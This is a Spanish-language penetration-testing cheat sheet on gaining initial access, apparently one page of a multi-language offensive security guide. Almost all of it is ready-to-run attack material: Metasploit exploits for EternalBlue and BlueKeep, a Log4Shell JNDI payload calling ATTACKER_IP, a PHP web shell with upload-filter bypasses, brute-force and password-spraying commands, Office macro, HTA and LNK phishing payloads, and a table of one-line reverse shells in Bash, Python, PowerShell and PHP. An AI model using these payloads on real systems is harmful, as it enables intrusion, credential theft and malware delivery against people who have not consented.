# 🚪 Fase 1: Acceso inicial

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](01-Initial-Access.tr.md) • [🇬🇷 Ελληνικά](01-Initial-Access.el.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Objetivo:** Conseguir el primer punto de apoyo en la red o el sistema objetivo.

---

## 🎯 Vectores de ataque

| Vector | Descripción |
|--------|-------------|
| **Explotación de aplicaciones expuestas a Internet** | Vulnerabilidades en aplicaciones web, API y CMS |
| **Phishing** | Correos maliciosos con cargas útiles (payloads) |
| **Credenciales válidas** | Password spraying (una contraseña contra muchas cuentas) y credential stuffing (reutilización de credenciales filtradas) |
| **Servicios externos** | RDP, SSH, VPN y FTP expuestos |
| **Cadena de suministro** | Comprometer software de confianza |

---

## 💻 Explotación de vulnerabilidades conocidas

### Búsqueda de exploits
```bash
# SearchSploit - Base de datos local de exploits
searchsploit apache 2.4
searchsploit -m 41234  # Copiar el exploit al directorio actual
searchsploit --nmap scan.xml  # Procesar los resultados de Nmap

# Búsqueda en Metasploit
msfconsole -q -x "search type:exploit apache"
```

### Exploits habituales

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Comprobar si es vulnerable
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Explotar con Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Comprobar la vulnerabilidad
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Configurar el servidor del exploit
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Comprobar ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Usar el exploit
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Ataques a aplicaciones web

### Inyección SQL (obtener una shell)
```bash
# Comprobar inyección SQL
sqlmap -u "http://target.com/page?id=1" --batch

# Obtener una shell del sistema operativo mediante SQLi
sqlmap -u "http://target.com/page?id=1" --os-shell

# Obtener una shell SQL
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### Obtener una shell mediante subida de archivos
```bash
# Crear una shell inversa PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# O una shell PHP sencilla
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Eludir filtros de extensiones
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Ejecución remota de código (RCE)
```bash
# Comprobar RCE
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Shell inversa mediante RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Ataques contra credenciales

### Password spraying (prueba de una contraseña contra varias cuentas)
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential stuffing (reutilización de credenciales filtradas)
```bash
# Usar credenciales filtradas conocidas
hydra -C creds.txt ftp://192.168.1.10

# Formato de creds.txt:
# username:password
```

### Credenciales predeterminadas
```bash
# Credenciales predeterminadas habituales que probar:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec con credenciales habituales
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Payloads de phishing

### Payload de macro de Office
```bash
# Generar el payload de macro
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# O usar msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### Payload HTA
```bash
# Generar un archivo HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Alojarlo
python3 -m http.server 80
```

### Payload LNK
```powershell
# Crear un acceso directo malicioso
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ Explotación de servicios externos

### Explotación de RDP
```bash
# Fuerza bruta contra RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### Explotación de SSH
```bash
# Fuerza bruta contra SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH con credenciales conocidas
ssh user@192.168.1.10

# SSH con clave privada
ssh -i id_rsa user@192.168.1.10
```

### Explotación de FTP
```bash
# Inicio de sesión anónimo
ftp 192.168.1.10
# Usuario: anonymous
# Contraseña: anonymous

# Fuerza bruta
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# Exploit de ProFTPd
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Configuración de listeners (receptores de conexiones)

### Listener de Netcat
```bash
nc -lvnp 4444
```

### Handler de Metasploit
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# En el equipo atacante
powercat -l -p 4444

# En el equipo objetivo
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Referencia rápida

### Shells inversas en una línea

| SO | Comando |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 Guías de referencia relacionadas

- [Metasploit](../../Metasploit/translations/README.es.md)
- [SQLMap](../../SQLMap/translations/README.es.md)
- [Hydra](../../Hydra/translations/README.es.md)
- [Vulnerabilidades web](../../SSRF/translations/README.es.md)

---

**Fase siguiente:** [02 - Enumeración/descubrimiento →](./02-Enumeration.es.md)
